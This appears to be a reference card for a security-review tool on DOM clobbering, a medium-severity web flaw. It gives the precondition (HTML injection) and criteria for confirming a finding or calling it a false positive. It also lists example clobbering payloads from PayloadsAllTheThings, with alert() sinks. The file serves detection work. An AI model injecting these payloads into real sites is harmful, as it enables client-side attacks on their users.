# DOM Clobbering — @domsmith skill
> cats: (advisory — no static taint rule yet) · severity: medium
> sources: PayloadsAllTheThings, HackTricks

## What it is
Exploitation requires any kind of `HTML injection` in the page.

## Exploit payloads (from PayloadsAllTheThings)
- `// Payload`
- `<form id=x><output id=y>I've been clobbered</output>`
- `// Sink`
- `<script>alert(x.y.value);</script>`
- `// Payload`
- `<a id=x><a id=x name=y href="Clobbered">`
- `// Sink`
- `<script>alert(x.y)</script>`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DOM%20Clobbering
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=DOM%20Clobbering
- HackTricks Cloud: https://cloud.hacktricks.wiki/
